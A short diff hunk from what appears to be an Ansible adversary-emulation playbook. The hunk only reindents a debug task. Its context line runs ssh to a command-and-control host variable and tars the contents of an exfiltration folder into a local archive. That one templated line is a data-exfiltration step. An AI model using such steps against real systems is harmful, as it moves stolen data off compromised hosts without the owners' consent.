@@ -12,7 +12,7 @@
       shell: |
         ssh {{ cnc_fqdn }} "(cd {{ exfiltration_folder }} && tar -zcvf - *) > ./{{ exfiltration_file }}.tar.gz"
       when: exfil_check.stat.exists
-     - debug:
-       msg: "Exfiltration folder does not exist"
-       when: file_details.stat.exists
+    - debug:
+      msg: "Exfiltration folder does not exist"
+      when: file_details.stat.exists
 
